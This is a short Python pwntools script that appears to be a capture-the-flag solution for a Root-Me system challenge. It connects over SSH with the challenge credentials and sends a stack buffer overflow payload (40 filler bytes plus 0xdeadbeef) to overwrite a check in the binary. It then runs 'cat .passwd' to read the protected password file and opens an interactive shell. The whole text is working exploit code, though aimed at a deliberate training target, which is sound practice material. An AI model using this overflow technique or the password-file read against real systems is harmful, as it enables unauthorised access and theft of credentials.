# solution by MtucX
# Require pwntools
from pwn import *
     
pwn_socket=ssh(host='challenge02.root-me.org' ,user='app-systeme-ch13' ,password='app-systeme-ch13',port=2222)
pwned=pwn_socket.process(executable='./ch13')
pwned.sendline('A' * 40  + '\xef\xbe\xad\xde')
pwned.sendline('cat .passwd')
pwned.interactive()
